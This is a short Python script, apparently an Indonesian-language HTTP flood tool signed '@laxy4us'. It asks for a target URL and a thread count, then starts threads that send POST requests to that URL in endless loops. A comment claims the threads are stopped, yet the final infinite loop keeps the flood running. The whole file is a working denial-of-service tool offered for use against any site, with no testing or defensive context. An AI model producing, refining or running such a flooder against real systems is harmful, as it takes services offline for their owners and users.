import requests
import threading
import time

print("CODE BY @laxy4us")

url = input("Masukkan URL: ")
num_threads = int(input("Masukkan jumlah thread awal: "))
interval = int(input("Masukkan interval pengiriman thread (detik): "))

count = 0

def send_request():
    global count
    while True:
        try:
            response = session.post(url, timeout=1)
            count += 1
            print(f'Response {count}: {response.status_code}')
        except requests.exceptions.Timeout:
            print("Request timeout")
        except requests.exceptions.ConnectionError as e:
            print(f"Connection error: {e}")
        finally:
            session.close()

# Buat objek session
session = requests.Session()

# Buat thread sebanyak num_threads untuk mengirimkan request POST
threads = []
for i in range(num_threads):
    t = threading.Thread(target=send_request)
    t.start()
    threads.append(t)

# Tunggu selama interval detik
time.sleep(interval)

# Hentikan semua thread
while True:
    pass
